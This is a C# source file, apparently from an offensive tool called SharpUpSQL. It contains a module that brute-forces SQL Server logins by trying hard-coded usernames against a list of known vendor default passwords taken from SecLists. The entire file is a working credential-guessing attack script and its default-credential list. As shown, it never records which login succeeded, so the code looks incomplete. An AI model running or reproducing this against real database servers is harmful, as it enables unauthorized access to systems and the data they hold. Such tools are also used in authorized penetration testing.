using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace SharpUpSQL
{
    class Bruteforce
    {
        // lists from SecLists
        static List<string> UsernameList = new List<string>(new string[] { "sa", "admin", "ARIS9", "ADONI", "gts", "ADMIN", "FB", "LENEL", "stream", "cic", "secure", "wasadmin", "maxadmin", "mxintadm", "maxreg", "I2b2metadata", "I2b2demodata", "I2b2workdata", "I2b2metadata2", "I2b2demodata2", "I2b2workdata2", "I2b2hive", "mcUser", "aadbo", "wwdbo", "aaAdmin", "wwAdmin", "aaPower", "wwPower", "aaUser", "wwUser" });
        static List<string> PasswordList = new List<string>(new string[] { "sa", "admin", "superadmin", "password", "sa_admin", "default", "admin", "RPSsql12345", "$ei$micMicro", "BPMS", "opengts", "PracticeUser1", "42Emerson42Eme", "sqlserver", "Cardio.Perfect", "vantage12!", "netxms", "AIMS", "AIMS", "$easyWinArt4", "DBA!sa@EMSDB123", "V4in$ight", "Pass@123", "trinity", "MULTIMEDIA", "SilkCentral12!34", "stream-1", "cic", "cic", "cic!23456789", "cic!23456789", "Administrator1", "M3d!aP0rtal", "splendidcrm2005", "gnos", "Dr8gedog", "dr8gedog", "Password123", "DBA!sa@EMSDB123", "SECAdmin1", "skf_admin1", "SecurityMaster08", "SecurityMaster08", "", "wasadmin", "maxadmin", "mxintadm", "maxreg", "capassword", "i2b2metadata", "i2b2demodata", "i2b2workdata", "i2b2metadata2", "i2b2demodata2", "i2b2workdata2", "i2b2hive", "medocheck123", "pwddbo", "pwddbo", "pwAdmin", "wwAdmin", "pwPower", "wwPower", "pwUser", "wwUser", "#SAPassword!" });

        public static void bruteforceSQL(string sqlInstanceParsedName)
        {
            Utils.print.blue("\t[*] Starting bruteforce module...");
            SqlConnection cnn;
            foreach (string sqlUsername in Bruteforce.UsernameList)
            {
                foreach (string sqlPassword in Bruteforce.PasswordList)
                {
                    try
                    {
                        cnn = SQLConnect.sqlConnect(sqlInstanceParsedName, sqlUsername, sqlPassword);
                        cnn.Close();
                    }
                    catch (SqlException ex)
                    {
                        //Console.WriteLine(ex.Message);
                        continue;
                    }
                }
            }
        }
    }
}
